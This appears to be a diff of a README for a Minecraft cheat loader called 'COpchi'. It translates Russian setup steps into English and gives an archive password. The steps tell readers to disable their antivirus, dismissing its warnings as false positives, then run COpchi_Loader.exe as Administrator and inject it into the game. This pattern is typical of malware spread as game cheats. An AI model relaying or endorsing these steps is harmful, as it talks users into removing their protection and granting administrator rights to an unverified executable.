@@ -9,14 +9,7 @@
 🔐 **Password**: <span style="color: #FFFF55">123</span>
 
 ```diff
-## <span style="color: #FF5555">⚙️</span> <span style="color: #5555FF">Шаги по установке</span>
-
-1. <span style="color: #FFFF55">⚠️ Отключите антивирус</span> (ложные срабатывания; см. раздел «Часто задаваемые вопросы» ниже)
-2. <span style="color: #55FF55">▶️ Запустите</span> `COpchi_Loader.exe` от имени администратора
-3. <span style="color: #55FFFF">🎮 Выберите версию Minecraft</span> и внедрите!
-
-```bash
-# Для разработчиков: сборка из исходного кода
-git clone https://github.com/COpchi/COpchiCHEATV11.1
-cd COpchiCHEATV11.1
-mvn clean package
+/* 🚀 Installation Guide */
+1. ⚠ Disable antivirus (false positives; see FAQ).
+2. ▶ Run COpchi_Loader.exe as Administrator.
+3. 🎮 Select your Minecraft version and inject!
